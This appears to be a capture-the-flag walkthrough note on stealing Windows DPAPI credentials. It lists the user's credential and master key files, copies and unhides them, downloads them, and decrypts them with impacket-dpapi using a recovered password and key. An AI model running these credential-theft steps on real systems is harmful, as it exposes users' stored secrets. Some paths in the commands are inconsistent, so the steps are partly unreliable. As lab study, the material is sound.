
DPAPI is an System in Windows which offers the storage of encrypted passwords.

```
dir -force C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials


    Directory: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-          3/8/2025   8:14 AM          11068 DFBE70A7E5CC19A398EBF1B96859CE5D
```

This displayed the DPAPI Encrypted Password.

In order to decrypt it we need master key.

Which we can find in:

```
dir -force C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407                                 
-a-hs-         2/23/2025   2:36 PM             24 Preferred
```

1. Copy DPAPI Password in C:\Temp

```
copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 dpapi_pass
```

2. Copy masterKey in C:\Temp

```
copy C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-
21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 masterKey
```

3. Unhidden both files

```
attrib -h -s masterKey
attrib -h -s dpapi_pass
```

4. Download both files.

```
download dpapi_pass
download masterKey
```

5. Decrypt masterKey

This will give us the key to decrypt the DPAPI Password.

```
impacket-dpapi masterkey -file masterKey -sid S-1-5-21-1487982659-1829050783-2281216199-1107 -password 'ChefSteph2025!'
```

6. Decrypt DPAPI Password

```
impacket-dpapi credential -f dpapi_pass -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```


